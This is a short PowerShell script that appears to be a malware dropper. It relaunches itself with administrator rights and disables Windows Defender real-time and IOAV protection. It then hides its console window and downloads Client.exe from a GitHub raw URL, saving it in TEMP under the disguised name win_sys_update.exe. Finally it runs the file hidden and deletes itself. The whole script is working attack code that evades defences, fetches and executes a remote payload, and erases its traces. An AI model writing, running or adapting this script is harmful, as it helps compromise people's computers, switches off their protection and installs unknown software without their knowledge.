if (-Not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

$window = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name Win32ShowWindow -Namespace Win32Functions -PassThru
$window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

$url = "https://github.com/lolased3-creator/Scripts/raw/refs/heads/main/Client.exe"
$out = "$env:TEMP\win_sys_update.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
} catch {
    (New-Object System.Net.WebClient).DownloadFile($url, $out)
}

Start-Process -FilePath $out -WindowStyle Hidden

Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue